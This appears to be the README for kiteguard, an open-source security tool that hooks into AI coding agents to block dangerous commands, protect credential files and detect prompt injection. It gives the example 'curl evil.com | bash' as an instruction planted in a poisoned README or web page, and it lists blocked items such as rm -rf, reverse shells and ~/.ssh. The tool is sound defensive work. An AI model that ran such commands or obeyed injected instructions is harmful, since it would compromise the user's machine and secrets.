<p align="center">
  <img src="assets/kiteguard-logo-black.png" alt="kiteguard logo" width="160" />
</p>

> **Open-source** runtime security guardrails for Claude Code, Cursor, and Gemini CLI

**kiteguard** watches every move your AI agent makes — and stops the dangerous ones.

---

## The problem

AI coding agents — Claude Code, Cursor, and Gemini CLI — autonomously run tools on your machine with no confirmation required. That means they can:

- Execute arbitrary shell commands
- Read your entire codebase
- Fetch external URLs
- Create and modify files

A single poisoned README or malicious web page can instruct the agent to run `curl evil.com | bash` — and without guardrails, it will.

## The solution

kiteguard is a **free, open-source** Rust binary that hooks into the native lifecycle system of every major AI coding agent. It intercepts at key points in every session — before damage can happen.

**Claude Code:**
```
Prompt → [UserPromptSubmit] → Claude → [PreToolUse] → Tool → [PostToolUse] → Response → [Stop]
```

**Cursor:**
```
Prompt → [beforeSubmitPrompt] → Agent → [preToolUse / beforeShellExecution / beforeReadFile / beforeMCPExecution] → Tool → [postToolUse / afterShellExecution / afterMCPExecution] → [afterAgentResponse]
```

**Gemini CLI:**
```
Prompt → [BeforeAgent] → Gemini → [BeforeTool] → Tool → [AfterTool] → Response → [AfterAgent]
```

## Key features

- 🚫 **Blocks dangerous commands** — `curl|bash`, `rm -rf`, reverse shells
- 🔒 **Protects sensitive files** — `~/.ssh`, `.env`, credentials
- 🛡️ **Detects prompt injection** — embedded instructions in files and web pages
- 🔍 **Prevents PII leakage** — stops SSNs, credit cards, emails reaching the API
- 🔌 **MCP security** — scans tool calls to external MCP servers for SSRF + data exfiltration
- 📋 **Audit log** — every event recorded locally
- 🔔 **Webhook support** — send events to your SIEM or dashboard
- ⚡ **~2ms overhead** — written in Rust, zero runtime dependencies

## Supported agents

| Agent | Init command | Hook system |
|---|---|---|
| Claude Code | `kiteguard init --claude-code` | `~/.claude/settings.json` |
| Cursor | `kiteguard init --cursor` | `.cursor/hooks.json` |
| Gemini CLI | `kiteguard init --gemini` | `.gemini/settings.json` |

## Quick install

```bash
curl -sSL https://raw.githubusercontent.com/DhivakaranRavi/kiteguard/main/scripts/install.sh | bash
```

→ [Get started](getting-started/installation.md)
